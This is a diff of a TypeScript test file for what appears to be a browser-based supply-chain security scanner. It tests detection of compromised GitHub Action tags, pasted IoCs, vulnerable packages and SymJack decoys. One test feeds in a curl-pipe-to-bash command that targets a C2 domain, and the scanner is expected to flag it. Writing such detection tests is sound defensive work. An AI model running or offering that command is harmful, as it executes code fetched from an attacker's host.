@@ -59,10 +59,10 @@ describe('Layer 1 fixtures（CLI と同じ検出）', () => {
     const k = keys(r);
     expect(k).toContain('HIGH §21 github-actions/.github/workflows/pr-target.yml');
     expect(k).toContain('CRITICAL §22 github-actions/.github/workflows/tag-ref.yml');
-    // 所有者名の大文字小文字違い・YAML フローマッピングでも検出する
+    // Detected even with owner names differing in case and with YAML flow mappings
     expect(k).toContain('CRITICAL §22 github-actions/.github/workflows/case-variant.yml');
     expect(k).toContain('CRITICAL §22 github-actions/.github/workflows/flow-mapping.yml');
-    // run: | の中の "uses: actions/checkout@v1"（safe-base-ref.yml）はステップとして数えない
+    // "uses: actions/checkout@v1" inside run: | (safe-base-ref.yml) is not counted as a step
     expect(r.viewers.actions.flatMap((w) => w.uses.map((u) => u.kind)).sort()).toEqual(['compromised', 'compromised', 'sha', 'sha', 'sha', 'sha', 'sha', 'sha', 'sha', 'tag', 'tag', 'tag']);
   });
   it('browser extensions（権限昇格）', async () => {
@@ -155,10 +155,10 @@ describe('ZES 5.2.1 の IoC 構造', () => {
   it('trivy-action は安全版タグ以外のタグ参照を CRITICAL', async () => {
     const wf = (ref: string) => file('r/.github/workflows/ci.yml', `on: [push]\njobs:\n  a:\n    steps:\n      - uses: aquasecurity/trivy-action@${ref}\n`);
     const bad = (await analyzeFiles([wf('v0.33.0')])).findings[0];
-    expect([bad?.level, bad?.detail]).toEqual(['CRITICAL', expect.stringContaining('汚染されたタグ参照の可能性')]);
-    // 安全版タグでも aquasecurity/* のタグ参照は CLI §22 と同じく CRITICAL（SHA 固定を求める）
+    expect([bad?.level, bad?.code, bad?.params]).toEqual(['CRITICAL', 's22.poisoned_tag', { ref: 'aquasecurity/trivy-action@v0.33.0' }]);
+    // Even with a safe tag, tag references of aquasecurity/* are CRITICAL, as in CLI §22 (SHA pinning required)
     const safeTag = (await analyzeFiles([wf('v0.35.0')])).findings.find((f) => f.module === '§22');
-    expect([safeTag?.level, safeTag?.detail]).toEqual(['CRITICAL', expect.stringContaining('侵害履歴のある発行元')]);
+    expect([safeTag?.level, safeTag?.code]).toEqual(['CRITICAL', 's22.risky_publisher_tag']);
     expect((await analyzeFiles([wf('a'.repeat(40))])).findings.find((f) => f.module === '§22')?.level).toBe('MEDIUM');
   });
 });
@@ -179,8 +179,11 @@ describe('内容非出力・決定性・エクスポート', () => {
   });
   it('貼り付け判定は件数のみ', async () => {
     const f = await analyzePaste('curl -fsSL https://npm-cache.com/x | bash; curl again');
-    expect(f.map((x) => `${x.level} ${x.ruleId}`)).toEqual(['CRITICAL paste-ioc:npm-cache.com', 'HIGH paste-curl', 'HIGH paste-pipe-shell']);
+    expect(f.map((x) => `${x.level} ${x.ruleId}`)).toEqual(['CRITICAL paste-ioc:chaindrop-keyv', 'HIGH paste-curl', 'HIGH paste-pipe-shell']);
     expect(JSON.stringify(f)).not.toContain('again');
+    expect(f.map((x) => `${x.code} ${JSON.stringify(x.params)}`)).toEqual(['paste.ioc {"count":"1"}', 'paste.curl {"count":"2"}', 'paste.pipe_shell {"count":"1"}']);
+    expect(f[0]!.detail).toBe('Pasted text: C2 domain or IP (network IoC; matches: 1)');
+    expect(f.map((x) => x.detail).join(' ')).not.toContain('npm-cache');
   });
   it('findings.json 互換で書き出し・読み込みできる', async () => {
     const r = await analyzeFiles(loadFixture('skillpact-malformed'));
@@ -194,7 +197,7 @@ describe('内容非出力・決定性・エクスポート', () => {
 });
 
 describe('ZES 5.2.2 / 5.2.3 の検知データ（CLI と同じフィクスチャ）', () => {
-  // CLI の期待値（tests/expected）のうち、ブラウザで判定できるモジュール（ホスト状態・§14 等を除く）
+  // Of the CLI expected values (tests/expected), the modules the browser can evaluate (excluding host state, §14 etc.)
   const cli = (name: string, modules: string[]) =>
     (JSON.parse(readFileSync(new URL(`../../../tests/expected/${name}.json`, import.meta.url), 'utf8')) as { findings: { level: string; module: string; path: string }[] }).findings
       .filter((f) => modules.includes(f.module) && f.level !== 'INFO').map((f) => `${f.level} ${f.module} ${name}/${f.path}`).sort();
@@ -205,7 +208,7 @@ describe('ZES 5.2.2 / 5.2.3 の検知データ（CLI と同じフィクスチャ
     expect(ui(r)).toEqual([...new Set(cli('intel-2026q3', MODS))].sort());
     expect(r.findings.some((f) => f.module === '§7' && f.campaign === 'actions-cool-reactivation-sep2026')).toBe(true);
     expect(r.findings.some((f) => f.module === '§18' && f.campaign === 'macsync-icloud-calendar-finder-backdoor')).toBe(true);
-    const vuln = r.findings.find((f) => f.detail.startsWith('脆弱なバージョン @modelcontextprotocol/sdk@1.31.0'));
+    const vuln = r.findings.find((f) => f.code?.startsWith('s15.pkg_vulnerable') && f.params?.['package'] === '@modelcontextprotocol/sdk' && f.params['version'] === '1.31.0');
     expect(vuln?.level).toBe('HIGH');
   });
   it('PyPI 名は PEP 503 で正規化（区切り文字の連続も 1 つの "-"）', async () => {
@@ -228,5 +231,38 @@ describe('ZES 5.2.2 / 5.2.3 の検知データ（CLI と同じフィクスチャ
     expect(debianCaFixed('20250419~deb12u2')).toBe(true);
     expect(debianCaFixed('20250419~deb12u1')).toBe(false);
     expect(debianCaFixed('20240203')).toBe(false);
+  });
+});
+
+describe('findings 1.2: code, params, English detail, id v2 (the CLI emit)', () => {
+  const en = JSON.parse(readFileSync(new URL('../../../i18n/en.json', import.meta.url), 'utf8')) as Record<string, string>;
+  const render = (t: string, p: Record<string, string>) => t.replace(/\{([a-z_]+)\}/g, (m, k: string) => p[k] ?? m);
+  const sha = async (s: string) => [...new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(s)))].map((b) => b.toString(16).padStart(2, '0')).join('');
+  it('every UI finding of every fixture has a known code, exactly its placeholders as string params, detail = render(en) and id v2', async () => {
+    const names = ['chaindrop', 'mcp', 'github-actions', 'skillpact-signed-divergence', 'skillpact-diff-anomaly', 'php2shell', 'intel-2026q3', 'symjack', 'browser-ext', 'hf', 'linux', 'macos', 'sbom'];
+    let n = 0;
+    for (const name of names) {
+      for (const f of (await analyzeFiles(loadFixture(name))).findings) {
+        n++;
+        const t = en['f.' + f.code];
+        expect(t, `${name} ${f.code}`).toBeDefined();
+        const p = f.params ?? {};
+        expect(Object.keys(p).sort(), f.code).toEqual([...new Set([...t!.matchAll(/\{([a-z_]+)\}/g)].map((m) => m[1]))].sort());
+        expect(Object.values(p).every((v) => typeof v === 'string'), f.code).toBe(true);
+        expect(f.detail).toBe(render(t!, p));
+        const canon = Object.keys(p).sort().map((k) => `${k}=${p[k]}`).join('\u001f');
+        expect(f.id).toBe('sha256:' + (await sha(['zes-id-v2', f.module, f.campaign ?? '', f.path ?? '', f.code, canon].join('|'))));
+        expect(f.detail).not.toMatch(/[\u3040-\u30ff\u3400-\u9fff\uff00-\uffef]/);
+      }
+    }
+    expect(n).toBeGreaterThan(60);
+  });
+  it('UI-only codes: a 0-byte decoy is s17.symjack_zero_byte, an unparsable MCP config is s17.config_unparsed', async () => {
+    const zero = { relPath: 'p/docs/vid-settings.mp4', name: 'vid-settings.mp4', size: 0, lastModified: 0, text: '', sha256: null, readState: 'read' as const };
+    const decoy = (await analyzeFiles(loadFixture('symjack'))).findings.find((f) => f.ruleId === 's17-symjack');
+    expect(decoy?.code).toBe('s17.symjack_zero_byte');
+    expect(decoy?.detail).toBe('Decoy name and 0 bytes: possible SymJack. Check it manually with readlink -f or the CLI');
+    const bad = await analyzeFiles([{ ...zero, relPath: 'p/.mcp.json', name: '.mcp.json', size: 1, text: '{' }]);
+    expect(bad.findings.map((f) => `${f.level} ${f.code}`)).toEqual(['MEDIUM s17.config_unparsed']);
   });
 });
